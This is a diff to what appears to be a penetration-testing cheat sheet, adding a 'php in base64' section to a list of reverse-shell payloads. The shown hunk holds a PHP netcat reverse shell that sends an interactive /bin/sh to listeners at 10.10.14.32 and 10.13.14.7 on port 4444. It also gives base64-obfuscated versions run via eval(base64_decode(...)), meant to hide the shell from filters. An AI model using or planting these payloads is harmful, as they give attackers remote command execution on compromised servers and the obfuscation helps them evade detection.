@@ -50,6 +50,21 @@
 
     <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f");?>
 
+# php in base64
+
+
+    system('id');   c3lzdGVtKCdpZCcpOw==    eval(base64_decode("c3lzdGVtKCdpZCcpOw=="));
+
+    <?php
+    $source = base64_encode("system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.14.7 4444 >/tmp/f');");
+    echo $source."\n";
+    c3lzdGVtKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMy4xNC43IDQ0NDQgPi90bXAvZicpOw==
+    eval(base64_decode($source));        
+    ?>    
+    => eval(base64_decode("c3lzdGVtKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMy4xNC43IDQ0NDQgPi90bXAvZicpOw=="));
+
+
+
 # Python
 
     - Collection of python TCP/UDP/PTY shells: https://github.com/infodox/python-pty-shells
